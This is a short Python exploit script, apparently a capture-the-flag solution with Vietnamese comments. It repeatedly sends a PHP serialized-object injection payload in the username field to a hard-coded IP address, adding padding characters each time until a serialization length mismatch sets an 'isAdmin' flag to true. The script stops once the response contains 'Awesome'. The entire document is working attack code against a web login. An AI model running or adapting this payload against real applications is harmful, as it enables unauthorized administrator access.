import requests

target = "http://160.250.64.22:4444/index.php"

for i in range(1, 201):   # brute tới 200
    username = 'BlueCyber' + ('A' * i) + '";s:7:"isAdmin";b:1;/*'
    password = '123'
    params = {"username": username, "password": password}

    print(f"[*] Test {i}")
    try:
        resp = requests.get(target, params=params, timeout=5)
    except Exception as e:
        print(f"Request failed: {e}")
        continue

    # In thử status và 100 ký tự đầu
    print(f"    Status: {resp.status_code}, len={len(resp.text)}")
    print("    Preview:", resp.text[:120].replace("\n","\\n"))

    if "Awesome" in resp.text:
        print(f">>> SUCCESS at i={i}")
        print(resp.text)
        break
